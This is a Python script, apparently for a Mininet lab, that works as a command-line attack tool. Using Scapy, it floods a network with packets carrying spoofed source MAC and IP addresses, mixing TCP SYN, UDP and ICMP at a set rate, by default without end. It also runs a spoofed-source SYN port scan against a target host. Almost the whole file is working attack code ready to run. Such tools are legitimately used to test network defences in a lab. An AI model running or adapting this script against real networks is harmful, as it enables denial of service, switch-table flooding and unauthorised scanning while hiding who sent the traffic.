#!/usr/bin/env python3

from scapy.all import Ether, IP, TCP, UDP, ICMP, sendp
import random
import time
import os
import argparse

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
MAC_FILE = os.path.join(SCRIPT_DIR, "fake_macs.txt")

# Default interface (change based on your Mininet host)
ATTACK_INTERFACE = "h1-eth0"

# Real target (legitimate host that exists)
REAL_TARGET_MAC = "00:00:00:00:00:02"
REAL_TARGET_IP = "10.0.0.2"

# Attack parameters
PACKETS_PER_SECOND = 100
ATTACK_DURATION = 0  # 0 = infinite


def load_macs_from_file(filename):
    """Load fake MAC addresses from file"""
    if not os.path.exists(filename):
        print(f"[ERROR] File not found: {filename}")
        print(f"[INFO] Please create fake_macs.txt with MAC addresses")
        print(f"[INFO] Example format:")
        print(f"    02:00:00:00:00:01")
        print(f"    02:00:00:00:00:02")
        print(f"    aa:bb:cc:11:22:33")
        return []
    
    with open(filename, "r") as f:
        macs = [line.strip() for line in f if line.strip()]
    
    print(f"[*] Loaded {len(macs)} MACs from {filename}")
    if macs:
        print(f"[*] Sample MACs: {macs[:3]}")
    return macs


def generate_fake_ip():
    """Generate a random fake IP address"""
    # Use private IP ranges that don't exist in your topology
    ip_blocks = [
        f"192.168.{random.randint(100,200)}.{random.randint(1,254)}",
        f"10.10.{random.randint(1,254)}.{random.randint(1,254)}",
        f"172.{random.randint(16,31)}.{random.randint(1,254)}.{random.randint(1,254)}"
    ]
    return random.choice(ip_blocks)


def generate_fake_dest_mac():
    """Generate a random fake destination MAC address"""
    return f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"


def create_attack_packet(src_mac, dst_mac, src_ip, dst_ip, protocol="TCP"):
    """Create various types of attack packets"""
    
    # Base Ethernet frame
    eth = Ether(src=src_mac, dst=dst_mac)
    
    # IP layer
    ip = IP(src=src_ip, dst=dst_ip)
    
    # Transport layer based on protocol
    if protocol == "TCP":
        sport = random.randint(1024, 65535)
        dport = random.choice([80, 443, 22, 8080, 53, 25, 110, 143, 993, 995])
        transport = TCP(sport=sport, dport=dport, flags="S")  # SYN flag for scanning
    elif protocol == "UDP":
        sport = random.randint(1024, 65535)
        dport = random.choice([53, 67, 68, 69, 123, 161, 514, 520, 1900])
        transport = UDP(sport=sport, dport=dport)
    elif protocol == "ICMP":
        transport = ICMP(type=8, code=0)  # Echo request (ping)
    else:
        transport = TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
    
    return eth / ip / transport


def mac_injection_attack(fake_macs, dest_choice="both"):
    """
    MAC Injection Attack - Spoof source MAC to different values
    
    dest_choice:
        "real" - send only to real target
        "fake" - send only to fake destinations  
        "both" - mix of real and fake destinations
    """
    print("\n" + "="*60)
    print("MAC INJECTION ATTACK")
    print("="*60)
    print(f"[*] Spoofing source MACs: {len(fake_macs)} different values")
    print(f"[*] Attack interface: {ATTACK_INTERFACE}")
    print(f"[*] Rate: {PACKETS_PER_SECOND} pkt/s")
    print(f"[*] Destination choice: {dest_choice}")
    print("="*60)
    
    packet_counter = 0
    start_time = time.time()
    attack_active = True
    
    try:
        while attack_active:
            for src_mac in fake_macs:
                # Choose destination based on user preference
                if dest_choice == "real":
                    dst_mac = REAL_TARGET_MAC
                    dst_ip = REAL_TARGET_IP
                elif dest_choice == "fake":
                    dst_mac = generate_fake_dest_mac()
                    dst_ip = generate_fake_ip()
                else:  # both
                    if random.choice([True, False]):
                        dst_mac = REAL_TARGET_MAC
                        dst_ip = REAL_TARGET_IP
                    else:
                        dst_mac = generate_fake_dest_mac()
                        dst_ip = generate_fake_ip()
                
                # Generate random source IP
                src_ip = generate_fake_ip()
                
                # Choose random protocol
                protocol = random.choice(["TCP", "UDP", "ICMP"])
                
                # Create packet
                pkt = create_attack_packet(src_mac, dst_mac, src_ip, dst_ip, protocol)
                
                # Send packet
                sendp(pkt, iface=ATTACK_INTERFACE, verbose=False)
                packet_counter += 1
                
                if packet_counter % 100 == 0:
                    elapsed = time.time() - start_time
                    rate = packet_counter / elapsed if elapsed > 0 else 0
                    print(f"[+] Sent {packet_counter} packets | Rate: {rate:.1f} pkt/s")
                    print(f"    src_mac={src_mac} | dst_mac={dst_mac[:12]}... | dst_ip={dst_ip} | proto={protocol}")
                
                # Rate limiting
                time.sleep(1.0 / PACKETS_PER_SECOND)
                
                # Check duration
                if ATTACK_DURATION > 0 and (time.time() - start_time) >= ATTACK_DURATION:
                    attack_active = False
                    break
                    
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    finally:
        elapsed = time.time() - start_time
        print("\n" + "="*60)
        print("ATTACK SUMMARY")
        print("="*60)
        print(f"[*] Total packets sent: {packet_counter}")
        print(f"[*] Duration: {elapsed:.1f} seconds")
        print(f"[*] Average rate: {packet_counter/elapsed:.1f} pkt/s")
        print(f"[*] Unique source MACs used: {len(fake_macs)}")
        print("="*60)


def port_scanning_attack(fake_macs, target_ip="10.0.0.2"):
    """
    Port scanning attack - Spoofed source, scanning multiple ports on target
    """
    print("\n" + "="*60)
    print("PORT SCANNING ATTACK (Spoofed Source)")
    print("="*60)
    print(f"[*] Target IP: {target_ip}")
    print(f"[*] Target MAC: {REAL_TARGET_MAC}")
    print(f"[*] Spoofing source MACs: {len(fake_macs)}")
    print(f"[*] Scanning ports: 1-1024")
    print("="*60)
    
    packet_counter = 0
    ports_scanned = 0
    
    try:
        for src_mac in fake_macs:
            src_ip = generate_fake_ip()
            
            for port in range(1, 1025, 10):  # Scan every 10th port for efficiency
                # SYN packet to target
                eth = Ether(src=src_mac, dst=REAL_TARGET_MAC)
                ip = IP(src=src_ip, dst=target_ip)
                tcp = TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
                pkt = eth / ip / tcp
                
                sendp(pkt, iface=ATTACK_INTERFACE, verbose=False)
                packet_counter += 1
                ports_scanned += 1
                
                if packet_counter % 50 == 0:
                    print(f"[+] Scanned {ports_scanned} ports | Sent {packet_counter} packets")
                    print(f"    Current src_mac={src_mac} | src_ip={src_ip} | port={port}")
                
                time.sleep(1.0 / PACKETS_PER_SECOND)
                
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted")
    
    finally:
        print(f"\n[*] Total packets sent: {packet_counter}")
        print(f"[*] Ports scanned: {ports_scanned}")


def main():
    parser = argparse.ArgumentParser(description="Advanced MAC Injection Attack Tool")
    parser.add_argument("--attack", choices=["mac_injection", "port_scan"], 
                        default="mac_injection", help="Type of attack")
    parser.add_argument("--interface", default="h1-eth0", help="Network interface (e.g., h1-eth0)")
    parser.add_argument("--rate", type=int, default=100, help="Packets per second")
    parser.add_argument("--duration", type=int, default=0, help="Attack duration in seconds (0=infinite)")
    parser.add_argument("--dest", choices=["real", "fake", "both"], 
                        default="both", help="Destination type for MAC injection attack")
    parser.add_argument("--target", default="10.0.0.2", help="Target IP for port scan")
    
    args = parser.parse_args()
    
    global ATTACK_INTERFACE, PACKETS_PER_SECOND, ATTACK_DURATION, REAL_TARGET_IP
    ATTACK_INTERFACE = args.interface
    PACKETS_PER_SECOND = args.rate
    ATTACK_DURATION = args.duration
    REAL_TARGET_IP = args.target
    
    print("[*] Advanced MAC Injection Attack Tool")
    print(f"[*] Interface: {ATTACK_INTERFACE}")
    print(f"[*] Rate: {PACKETS_PER_SECOND} pkt/s")
    if ATTACK_DURATION > 0:
        print(f"[*] Duration: {ATTACK_DURATION} seconds")
    
    # Load fake MACs from file
    fake_macs = load_macs_from_file(MAC_FILE)
    if not fake_macs:
        print("\n[ERROR] No MACs available for attack!")
        print("[*] Please create fake_macs.txt file with one MAC address per line")
        print("\nExample fake_macs.txt:")
        print("02:00:00:00:00:01")
        print("02:00:00:00:00:02")
        print("aa:bb:cc:11:22:33")
        print("de:ad:be:ef:00:01")
        return
    
    if args.attack == "mac_injection":
        mac_injection_attack(fake_macs, args.dest)
    elif args.attack == "port_scan":
        port_scanning_attack(fake_macs, args.target)


if __name__ == "__main__":
    main()
